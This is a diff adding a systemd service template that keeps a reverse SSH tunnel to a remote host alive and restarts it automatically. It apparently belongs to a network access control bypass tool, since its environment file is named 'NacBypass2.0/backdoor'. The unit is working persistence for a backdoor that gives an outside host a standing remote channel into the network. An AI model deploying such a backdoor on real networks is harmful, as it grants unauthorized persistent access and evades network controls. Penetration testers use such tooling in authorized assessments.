@@ -1,0 +1,13 @@
+[Unit]
+Description=Setup a remote secure tunnel to %I
+After=network.target
+
+[Service]
+Environment="LOCAL_ADDR=localhost"
+EnvironmentFile=/opt/NacBypass2.0/backdoor@%i
+ExecStart=/usr/bin/ssh -NT -o ServerAliveInterval=60 -o ServerAliveCountMax=2 -o ExitOnForwardFailure=yes -R ${LOCAL_PORT}:localhost:${REMOTE_PORT} ${TARGET}
+RestartSec=5
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
